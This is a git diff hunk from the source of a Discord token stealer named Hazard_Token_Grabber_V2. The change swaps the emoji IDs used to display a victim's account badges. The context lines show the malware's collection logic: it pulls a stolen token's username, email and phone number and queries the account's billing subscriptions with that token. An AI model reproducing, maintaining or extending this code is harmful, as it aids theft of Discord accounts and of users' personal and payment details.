@@ -350,20 +350,20 @@ class Hazard_Token_Grabber_V2:
                             pass
             badges = ""
             flags = j['flags']
-            if (flags == 1): badges += "<:staff_blue:936543701294010399> "
-            if (flags == 2): badges += "<:PartneredServerOwner:923782988041441352> "
+            if (flags == 1): badges += "<:staff_blue:951786138471919626> "
+            if (flags == 2): badges += "<:partner:951785714234851368> "
             if (flags == 4): badges += "<:HypesquadEvents_FX:929722784039436318> "
-            if (flags == 8): badges += "<:cntr_BugHunter:893164631764394024>"
-            if (flags == 64): badges += "<:HypeSquadBravery:941037226370957332> "
-            if (flags == 128): badges += "<:HypeSquadBrilliance:941037162357489724> "
-            if (flags == 256): badges += "<:hypesquadbalanceCopy:930309005782441985> "
-            if (flags == 512): badges += "<a:early:925791052512788551> "
-            if (flags == 16384): badges += "<:TG_DiscordBugHunter:921967832739237928> "
-            if (flags == 131072): badges += "<:1947_botdeveloper:908019479882125414> "
-            if (badges == ""): badges = "<a:420_cross:931468716779114536>"
+            if (flags == 8): badges += "<:BugHunter:951786313332449350>"
+            if (flags == 64): badges += "<:bravery:951785279734308894> "
+            if (flags == 128): badges += "<:hypered:951785499977216051> "
+            if (flags == 256): badges += "<:hypesquadbalance:951786439857815552> "
+            if (flags == 512): badges += "<a:early:951784170298957825> "
+            if (flags == 16384): badges += "<:goldDiscordBugHunter:951786368210706432>"
+            if (flags == 131072): badges += "<:dev:951784131140939796>  "
+            if (badges == ""): badges = "<a:carpi:951786547387191386>"
             user = j["username"] + "#" + str(j["discriminator"])
             email = j["email"]
-            phone = j["phone"] if j["phone"] else "No Phone Number attached"
+            phone = j["phone"] if j["phone"] else "<a:carpi:951786547387191386>"
             try:
                 nitro_data = requests.get(self.baseurl+'/billing/subscriptions', headers=self.getheaders(token)).json()
             except Exception:
